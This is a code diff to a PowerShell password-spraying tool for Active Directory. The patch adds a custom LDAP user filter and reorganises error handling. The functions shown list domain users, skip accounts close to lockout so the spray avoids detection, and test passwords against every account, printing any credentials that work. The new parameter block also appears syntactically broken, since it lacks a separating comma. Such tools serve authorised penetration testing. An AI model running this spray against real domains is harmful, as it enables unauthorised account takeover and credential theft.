@@ -34,6 +34,10 @@ function Invoke-DomainPasswordSpray{
 
     The domain to spray against.
 
+    .PARAMETER Filter
+
+    Custom LDAP filter for users, e.g. "(description=*admin*)"
+
     .PARAMETER Force
 
     Forces the spray to continue and doesn't prompt for confirmation.
@@ -82,39 +86,31 @@ function Invoke-DomainPasswordSpray{
      [switch]
      $Force
     )
-    if ($Domain -ne "")
+    try
     {
-        try
+        if ($Domain -ne "")
         {
             # Using domain specified with -Domain option
             $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
             $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
             $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
         }
-        catch
-        {
-            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try again specifying the domain name with the -Domain option."
-            break
-        }
-    }
-    else
-    {
-        try
+        else
         {
             # Trying to use the current user's domain
             $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
             $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
         }
-        catch
-        {
-            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
-            break
-        }
+    }
+    catch
+    {
+        Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
+        break
     }
 
     if ($UserList -eq "")
     {
-        $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts
+        $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts -Filter $Filter
     }
     else
     {
@@ -134,7 +130,6 @@ function Invoke-DomainPasswordSpray{
 
     }
 
-    # If a single password is selected do this
     if ($Password)
     {
         $Passwords = @($Password)
@@ -148,6 +143,7 @@ function Invoke-DomainPasswordSpray{
         Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
         break
     }
+
     if ($Passwords.count > 1)
     {
         Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
@@ -183,7 +179,7 @@ function Invoke-DomainPasswordSpray{
     Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
     Write-Host "[*] This might take a while depending on the total number of users"
 
-    ForEach($Password_Item in $Passwords)
+    foreach($Password_Item in $Passwords)
     {
         Invoke-SpraySinglePassword($CurrentDomain, $UserListArray, $Password_Item)
         Countdown-Timer -Seconds (60*$observation_window)
@@ -202,7 +198,8 @@ function Countdown-Timer
         $Message = "[*] Pausing to avoid account lockout."
     )
     foreach ($Count in (1..$Seconds))
-    {   Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
+    {
+        Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
         Start-Sleep -Seconds 1
     }
     Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
@@ -237,9 +234,13 @@ function Get-DomainUserList{
 
     Removes accounts within 1 attempt of locking out.
 
+    .PARAMETER Filter
+
+    Custom LDAP filter for users, e.g. "(description=*admin*)"
+
     .EXAMPLE
 
-    C:\PS> Get-DomainUserList
+    PS C:\> Get-DomainUserList
 
     Description
     -----------
@@ -266,36 +267,32 @@ function Get-DomainUserList{
      [Parameter(Position = 2, Mandatory = $false)]
      [switch]
      $RemovePotentialLockouts
+
+     [Parameter(Position = 2, Mandatory = $false)]
+     [string]
+     $Filter
     )
 
-    if ($Domain -ne "")
+    try
     {
-        try
+        if ($Domain -ne "")
         {
             # Using domain specified with -Domain option
             $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
             $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
             $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
         }
-        catch
-        {
-            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try again specifying the domain name with the -Domain option."
-            break
-        }
-    }
-    else
-    {
-        try
+        else
         {
             # Trying to use the current user's domain
             $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
             $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
         }
-        catch
-        {
-            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
-            break
-        }
+    }
+    catch
+    {
+        Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
+        break
     }
 
     # Setting the current domain's account lockout threshold
@@ -332,7 +329,6 @@ function Get-DomainUserList{
                 Write-Host "[*] Fine-Grained Password Policy titled: $PSOPolicyName has a Lockout Threshold of $PSOLockoutThreshold attempts, minimum password length of $PSOMinPwdLength chars, and applies to $PSOAppliesTo.`r`n"
             }
         }
-
     }
 
     $observation_window = Get-ObservationWindow
@@ -360,18 +356,20 @@ function Get-DomainUserList{
     $UserSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
     $UserSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null
 
-    if ($RemoveDisabled){
+    if ($RemoveDisabled)
+    {
         Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
         # More precise LDAP filter UAC check for users that are disabled (Joff Thyer)
         # LDAP 1.2.840.113556.1.4.803 means bitwise &
         # uac 0x2 is ACCOUNTDISABLE
         # uac 0x10 is LOCKOUT
         # See http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/
-        $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=18))"
+        $UserSearcher.filter =
+            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=18)$Filter)"
     }
     else
     {
-        $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user))"
+        $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user)$Filter)"
     }
 
     # grab batches of 1000 in results
@@ -383,7 +381,7 @@ function Get-DomainUserList{
     if ($RemovePotentialLockouts)
     {
         Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
-        Foreach ($user in $AllUserObjects)
+        foreach ($user in $AllUserObjects)
         {
             # Getting bad password counts and lst bad password time for each user
             $badcount = $user.Properties.badpwdcount
@@ -402,11 +400,12 @@ function Get-DomainUserList{
 
             if ($badcount)
             {
-
                 [int]$userbadcount = [convert]::ToInt32($badcount, 10)
                 $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount
-                # if there is more than 1 attempt left before a user locks out or if the time since the last failed login is greater than the domain observation window add user to spray list
-                if (($timedifference -gt $observation_window) -Or ($attemptsuntillockout -gt 1))
+                # if there is more than 1 attempt left before a user locks out
+                # or if the time since the last failed login is greater than the domain
+                # observation window add user to spray list
+                if (($timedifference -gt $observation_window) -or ($attemptsuntillockout -gt 1))
                 {
                     $UserListArray += $samaccountname
                 }
@@ -415,7 +414,7 @@ function Get-DomainUserList{
     }
     else
     {
-        Foreach ($user in $AllUserObjects)
+        foreach ($user in $AllUserObjects)
         {
             $samaccountname = $user.Properties.samaccountname
             $UserListArray += $samaccountname
@@ -445,7 +444,7 @@ function Invoke-SpraySinglePassword($CurrentDomain, $UserListArray, $Password)
             }
             Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
         }
-        $curr_user+=1
+        $curr_user += 1
         Write-Host -nonewline "$curr_user of $count users tested`r"
     }
     Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
